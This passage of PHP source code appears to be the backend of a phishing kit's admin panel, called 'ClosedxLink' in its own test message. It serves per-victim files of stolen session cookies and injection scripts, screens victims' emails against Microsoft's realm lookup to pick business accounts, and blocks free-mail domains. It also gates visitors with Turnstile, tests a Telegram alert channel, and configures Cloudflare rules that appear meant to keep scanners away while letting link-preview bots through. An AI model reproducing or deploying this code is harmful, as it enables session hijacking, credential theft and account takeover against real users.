        $sessionDir = __DIR__ . '/../session_data';
        if (is_dir($sessionDir)) {
            $files = glob($sessionDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) unlink($file);
            }
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetCookies() {
        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
        $type = isset($_GET['type']) ? $_GET['type'] : '';

        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $jsFile = $sessionDir . '/inject_session_' . $id . '.js';
        $txtFile = $sessionDir . '/cookies_all_' . $id . '.txt';

        if ($type === 'js') {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Script not found']);
            }
        } elseif ($type === 'txt') {
            if (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        } else {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } elseif (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        }
    }

    private static function handleVerifyEmail() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false]);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $email = is_array($data) && isset($data['email']) ? trim($data['email']) : '';
        if ($email === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'email_required']);
            exit;
        }

        $cfg = Config::load();
        $domain = substr(strrchr($email, "@"), 1);
        if ($domain) {
            $domain = strtolower($domain);
            $blockedDomains = [
                "outlook.com","hotmail.com","live.com","msn.com",
                "yahoo.com","ymail.com","gmail.com","googlemail.com",
                "aol.com","icloud.com","me.com","mac.com",
                "proton.me","protonmail.com","mail.com","gmx.com"
            ];
            
            if (in_array($domain, $blockedDomains)) {
                 echo json_encode(['ok' => true, 'isBusiness' => false, 'ns' => 'Blocked']);
                 exit;
            }
        }

        $url = 'https://login.microsoftonline.com/common/userrealm/' . rawurlencode($email) . '?api-version=1.0';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4);

        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }

        $resp = curl_exec($ch);
        $err = curl_error($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if ($err || $code < 200 || $code >= 300 || !$resp) {
            http_response_code(502);
            echo json_encode(['ok' => false]);
            exit;
        }
        $j = json_decode($resp, true);
        $ns = '';
        if (is_array($j)) {
            if (isset($j['NameSpaceType'])) $ns = (string)$j['NameSpaceType'];
            else if (isset($j['account_type'])) $ns = (string)$j['account_type'];
        }
        
        $isBiz = ($ns === 'Managed' || $ns === 'Federated');
        echo json_encode(['ok' => true, 'isBusiness' => $isBiz, 'ns' => $ns]);
    }

    private static function handleVerifyTurnstile() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            echo json_encode(['ok' => false]);
            exit;
        }
        $input = json_decode(file_get_contents('php://input'), true);
        $token = $input['token'] ?? '';
        if (!$token) {
            echo json_encode(['ok' => false, 'error' => 'No token']);
            exit;
        }

        $cfg = Config::load();
        $secretKey = $cfg['cfSecretKey'] ?? '';
        if (!$secretKey) {
            echo json_encode(['ok' => false, 'error' => 'Server misconfiguration']);
            exit;
        }

        $ip = Security::getClientIp();

        $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
        $data = [
            'secret' => $secretKey,
            'response' => $token,
            'remoteip' => $ip
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }

        $res = curl_exec($ch);
        $json = json_decode($res, true);

        if ($json && ($json['success'] ?? false)) {
            $_SESSION['turnstile_verified'] = true;
            echo json_encode(['ok' => true]);
        } else {
            echo json_encode(['ok' => false, 'error' => 'Verification failed']);
        }
    }

    private static function handleTestTelegram() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);

        if (empty($data['botToken']) || empty($data['chatId'])) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing botToken or chatId']);
            exit;
        }

        $botToken = $data['botToken'];
        $chatId = $data['chatId'];
        $message = "🔔 *Test Notification*\n\nYour ClosedxLink Admin Panel is successfully connected to Telegram!";
        
        $cfg = Config::load();

        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payload = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        $proxyEnabled = isset($data['proxyEnabled']) ? $data['proxyEnabled'] : (!empty($cfg['proxyEnabled']) ? $cfg['proxyEnabled'] : false);
        $proxyUrl = isset($data['proxyUrl']) ? $data['proxyUrl'] : (!empty($cfg['proxyUrl']) ? $cfg['proxyUrl'] : '');

        if ($proxyEnabled && !empty($proxyUrl)) {
            curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
        }

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);

        if ($httpCode === 200 && $response) {
            $json = json_decode($response, true);
            if ($json['ok']) {
                echo json_encode(['ok' => true]);
            } else {
                echo json_encode(['ok' => false, 'error' => $json['description'] ?? 'Telegram API Error']);
            }
        } else {
            echo json_encode(['ok' => false, 'error' => $error ?: "HTTP $httpCode"]);
        }
    }

    private static function handleDeploySecurity() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $input = json_decode(file_get_contents('php://input'), true);
        $apiKey = $input['cfApiKey'] ?? '';
        $email = $input['cfEmail'] ?? '';
        $zoneId = $input['cfZoneId'] ?? '';

        if (!$apiKey || !$email || !$zoneId) {
            echo json_encode(['ok' => false, 'error' => 'Missing Cloudflare credentials']);
            exit;
        }
        
        $cfg = Config::load();
        
        $cf_call = function($method, $endpoint, $data = null) use ($apiKey, $email, $cfg) {
            $url = "https://api.cloudflare.com/client/v4" . $endpoint;
            $ch = curl_init($url);
            
            $headers = [
                "X-Auth-Email: $email",
                "X-Auth-Key: $apiKey",
                "Content-Type: application/json"
            ];
            
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
                curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
            }
            
            if ($method !== 'GET') {
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
                if ($data) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
                }
            }
            
            $res = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            return ['code' => $code, 'body' => json_decode($res, true)];
        };

        $errors = [];

        $res = $cf_call('PATCH', "/zones/$zoneId/settings/security_level", ['value' => 'under_attack']);
        if (!($res['body']['success'] ?? false)) $errors[] = "SecLevel: " . ($res['body']['errors'][0]['message'] ?? 'Fail');

        $res = $cf_call('PATCH', "/zones/$zoneId/settings/browser_check", ['value' => 'on']);
        if (!($res['body']['success'] ?? false)) $errors[] = "BIC: " . ($res['body']['errors'][0]['message'] ?? 'Fail');

        $res = $cf_call('PATCH', "/zones/$zoneId/settings/always_use_https", ['value' => 'on']);
        if (!($res['body']['success'] ?? false)) $errors[] = "HTTPS: " . ($res['body']['errors'][0]['message'] ?? 'Fail');

        $res = $cf_call('PATCH', "/zones/$zoneId/settings/min_tls_version", ['value' => '1.2']);
        if (!($res['body']['success'] ?? false)) $errors[] = "TLS: " . ($res['body']['errors'][0]['message'] ?? 'Fail');

        $res = $cf_call('PUT', "/zones/$zoneId/bot_management", ['fight_mode' => true, 'enable_js' => true]);
        if (!($res['body']['success'] ?? false)) {
            $res2 = $cf_call('PUT', "/zones/$zoneId/bot_management", ['mode' => 'fight']);
            if (!($res2['body']['success'] ?? false)) {
                $errors[] = "BotMode: " . ($res['body']['errors'][0]['message'] ?? 'Fail');
            }
        }

        $botExpression = '(http.user_agent contains "TelegramBot") or (http.user_agent contains "facebookexternalhit") or (http.user_agent contains "Twitterbot") or (http.user_agent contains "WhatsApp") or (http.user_agent contains "Discordbot") or (http.user_agent contains "LinkedInBot") or (http.user_agent contains "SkypeUriPreview") or (http.user_agent contains "Applebot")';

        $wafRules = [
            [
                'filter' => [
                    'expression' => $botExpression,
                    'paused' => false,
                    'description' => 'Allow Social Media Bots'
                ],
                'action' => 'allow',
                'description' => 'Allow Social Previews'
            ],
            [
                'filter' => [
                    'expression' => '(cf.threat_score > 10) or (not http.request.version in {"HTTP/2" "HTTP/3"})',
                    'paused' => false,
                    'description' => 'Block high threat and legacy protocols'
                ],
                'action' => 'block',
                'description' => 'Zero Tolerance Bot Protection'
            ]
        ];
        $res = $cf_call('POST', "/zones/$zoneId/firewall/rules", $wafRules);
        if (!($res['body']['success'] ?? false)) {
             $msg = $res['body']['errors'][0]['message'] ?? 'Fail';
             if (strpos($msg, 'already exists') === false) {
                 $errors[] = "WAF: " . $msg;
             }
        }

        if (empty($errors)) {
            echo json_encode(['ok' => true]);
        } else {
            echo json_encode(['ok' => false, 'error' => implode(', ', $errors)]);
        }
    }
}
